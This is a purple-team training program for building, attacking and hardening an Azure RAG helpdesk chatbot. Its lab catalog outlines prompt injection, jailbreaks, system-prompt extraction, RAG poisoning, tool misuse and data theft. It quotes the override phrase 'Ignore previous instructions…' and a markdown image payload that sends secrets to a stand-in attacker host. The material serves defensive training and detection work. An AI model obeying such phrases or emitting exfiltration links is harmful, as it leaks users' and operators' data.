# Azure Enterprise RAG Chatbot — Build & Break Lab Program

A purple-team lab series: stand up a real IT-helpdesk RAG assistant on Azure,
then attack it lab by lab, hardening one control at a time.

---

## Program Overview

| Attribute | Value |
|---|---|
| **Codename** | HELPDESK-RAG-PURPLE |
| **Audience** | Cloud/AppSec engineers, AI red teamers, detection engineers |
| **Format** | 14 labs × (Build 45–90 min + Attack 30–60 min + Detection 30 min) |
| **Prereqs** | Azure subscription with OpenAI access, Entra ID, basic Python + KQL |
| **Frameworks** | OWASP Top 10 for LLM Applications (2025), MITRE ATLAS, NIST AI RMF, Azure WAF |
| **Thesis** | Every control is proven only when a red-team attack fails against it and the attempt is detected. |
| **Out of scope** | Live third-party targets, real PII/PHI, production tenants, fine-tuning frontier models |

**Design rules**

Every lab in this program follows four constraints. First: the baseline build
is insecure by design. No auth on the API, the system prompt lives in the
client, no output sanitization, retrieval is unrestricted. Second: one control
per lab. Each hardening step is independently testable and independently
revertable. Third: the attack must produce telemetry. A lab that does not log
is incomplete. Fourth: synthetic corpus only. Fictional employee handbook, fake
runbooks, canary secrets that look real but are not.

---

## Reference Architecture

```
                          ┌──────────────────────────────────┐
  Attacker ──┐            │  Web App  (App Service / ACA)    │
             │  HTTPS     │  ├─ Entra ID auth        [A]     │
  Employee ──┼───────────►│  ├─ Orchestrator (Py/TS)         │
             │            │  └─ Session store        [B]     │
             │            └──────┬──────────────┬────────────┘
             │                   │              │
             │        ┌──────────▼───┐    ┌─────▼────────────┐
             │        │ Azure OpenAI │    │ Azure AI Search  │
             │        │ ├ chat       │    │ ├ vector index   │
             │        │ └ embeddings │    │ ├ semantic rank  │
             │        └──────┬───────┘    │ └ filters  [C]   │
             │               │            └─────▲────────────┘
             │        ┌──────▼──────────┐       │ indexer
             │        │ Content Safety  │  ┌────┴─────────────┐
             │        │ Prompt Shields  │  │ Blob Storage     │
             │        │ Groundedness    │  │ ├ corpus         │
             │        └─────────────────┘  │ └ canaries [D]   │
             │                             └──────────────────┘
             │        ┌───────────────────────────────────────┐
             └───────►│ API Management  (rate limits, WAF)    │
                      └───────────────────────────────────────┘

  Observability: App Insights · Log Analytics · Defender for Cloud AI Threat Protection
  Secrets: Key Vault · Managed Identity (no keys in code)
```

**Trust boundaries**

| ID | Boundary | Crossed by |
|---|---|---|
| **A** | Internet to App | Unauthenticated users, bots |
| **B** | App to Session | Session fixation, IDOR |
| **C** | App to Index | Tenant/role filter bypass |
| **D** | Unvetted docs to Index | Indirect prompt injection |
| **E** | Model to Tools/Plugins | Excessive agency |
| **F** | Model output to Browser/Downstream | Improper output handling |

---

## Lab Catalog

| # | Lab title | OWASP | ATLAS | Build adds | Attack proves |
|---|---|---|---|---|---|
| 00 | Insecure baseline | all | — | App + AOAI + Search + Blob, no auth | Bypass auth, dump system prompt, read all docs |
| 01 | Direct prompt injection | LLM01 | AML.T0051 | Input classifier + system-prompt isolation | "Ignore previous instructions…" |
| 02 | Indirect injection via RAG | LLM01, LLM04 | AML.T0051, AML.T0043 | Ingest-time scanning, provenance tags | Poisoned doc hijacks other users |
| 03 | Jailbreak / guardrail bypass | LLM01 | AML.T0054 | Content Safety + Prompt Shields | Role-play / encoding / multi-turn crescendo |
| 04 | System prompt leakage | LLM07 | AML.T0056 | Prompt server-side, canary in prompt | Extraction via translation, "repeat above" |
| 05 | Sensitive info disclosure | LLM02 | AML.T0057 | Per-user ACL filters in AI Search | User A reads User B's runbook |
| 06 | Improper output handling | LLM05 | — | Output encoding, markdown allowlist | XSS in web app; SSRF via rendered link |
| 07 | Excessive agency — tool use | LLM06 | AML.T0053 | Tool allowlist, arg validation, human-in-the-loop | Model calls a write tool it shouldn't |
| 08 | Vector & embedding weaknesses | LLM08 | AML.T0043 | Index ACL, embedding checks, dedupe scoring | Similarity search surfaces poisoned chunks |
| 09 | Data exfil via markdown/callback | LLM02, LLM01 | AML.T0024, AML.T0025 | Image/link egress proxy, CSP, NSG deny | `![](https://attacker/?d=<secret>)` |
| 10 | Unbounded consumption | LLM10 | AML.T0034 | APIM rate limits, token caps, timeouts | Token-flood drains quota |
| 11 | Supply chain | LLM03 | AML.T0010 | Pinned model versions, SBOM, signed images | Typosquatted dependency / swapped model |
| 12 | Misinformation / overreliance | LLM09 | — | Groundedness detection, citation enforcement | Confident hallucinated procedure |
| 13 | Agentic escalation (capstone) | LLM06 + LLM01 | AML.T0051 → T0053 | Full guard stack + egress deny + least-priv MI | Chained indirect injection → tool call → exfil |
| 14 | Purple-team capstone & IR | all | all | Sentinel workbook, runbook, tabletop | Red team re-runs full kill chain; blue detects all |

Verify all ATLAS technique IDs against the current matrix before citing them in a report. The matrix is versioned and IDs shift between releases.

---

## Telemetry Plan

**Custom events emitted by the app**

| Event | Key fields |
|---|---|
| `chat.request` | `user_id`, `tenant_id`, `session_id`, `prompt_hash`, `prompt_len`, `ip` |
| `retrieval.result` | `query_hash`, `chunk_ids[]`, `acl_filter`, `score_top` |
| `guard.verdict` | `guard`, `verdict`, `category`, `confidence` |
| `model.completion` | `prompt_tokens`, `completion_tokens`, `latency_ms`, `model_version`, `finish_reason` |
| `tool.invocation` | `tool_name`, `args_redacted`, `allowed`, `principal` |
| `output.render` | `contains_html`, `contains_link`, `contains_image`, `sanitized` |

**Native sources**

Wire Application Insights and Log Analytics first. Then: Azure OpenAI diagnostic
logs, Defender for Cloud AI threat protection, AI Search diagnostics, NSG flow
logs, Entra ID sign-in logs with conditional access.

**Detection skeleton**

```kql
// detections/kql/NN-<name>.kql
customEvents
| where name == "guard.verdict" or name == "chat.request"
| extend d = parse_json(customDimensions)
| where d.verdict == "block"
| summarize hits = count(), first = min(timestamp), last = max(timestamp)
    by user_id = tostring(d.user_id), bin(timestamp, 5m)
| where hits > 5
```

---

## Scoring Rubric

| Dimension | Points | Criteria |
|---|---|---|
| Build correct | 20 | IaC applies clean; smoke test passes |
| Attack reproduces on v(N-1) | 20 | Deterministic, documented payload |
| Control applied and justified | 20 | Diff shown; reasoning sound; not just "added a filter" |
| Attack fails on vN | 15 | Re-run same payload, blocked |
| Detection fires | 15 | KQL alert with ID; benign replay clean |
| Evidence quality | 5 | Logs, screenshots, findings.md usable by a third party |
| Honesty / residual risk | 5 | Declares bypasses that still work |

Solving lab 14 end-to-end doubles the program score.

---

## Safety and Legal

Work in a dedicated isolated Azure subscription. Use the synthetic corpus
exclusively. No real PII or PHI ever enters the environment. Canaries use
random-looking tokens (`CANARY-4f9a…`), not real credentials. Exfil endpoints
resolve to a lab-controlled sink. Set a hard budget alert at 70% of the
per-lab limit and enable automatic quota shutdown. Run `scripts/teardown` when
a lab is complete to delete the resource group, purge the AOAI deployment, and
revoke the managed identity.

Do not publish novel bypass techniques against a specific vendor's model
without responsible disclosure.

---

## Extension Tracks

Agentic: add planner/executor agents, MCP tool server, multi-agent trust
collapse. Fine-tune attacks: backdoored adapter, weight-level poisoning
(AML.T0018). Multimodal: image/PDF ingestion with injection via OCR layer.
Scale: multi-tenant SaaS with row-level security in the index. Compliance: map
every control to NIST AI RMF GOVERN/MAP/MEASURE/MANAGE and ISO 42001.

---

## Deliverables

One `findings.md` per lab, `infra/deploy.v14` as the hardened reference
architecture, the full KQL detection pack importable to Sentinel,
`docs/threat-model.md` with all six trust boundaries and their attack paths,
and a ten-minute brief covering architecture, three best attacks, three best
detections, and residual risk.
